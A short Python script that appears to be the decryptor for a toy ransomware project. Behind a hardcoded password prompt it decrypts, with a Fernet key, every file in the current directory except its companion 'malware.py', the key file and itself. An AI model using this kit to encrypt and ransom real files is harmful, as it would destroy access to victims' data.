#!/usr/bin/env python3

import  os
from cryptography.fernet import Fernet

files = []
for file in os.listdir():
    if file == "malware.py" or file == "key.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)


print(files)

with open("key.key", "rb") as key:
    secret = key.read()
passphrase = "pswrd"
upassword = input("enter the password to decrypt your files: ")
if upassword == passphrase:
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_decrypt = Fernet(secret).decrypt(content)
        with open(file,"wb") as thefile:
            thefile.write(content_decrypt)
        print("files decrypted")
else:
    print("enter the correct password!")
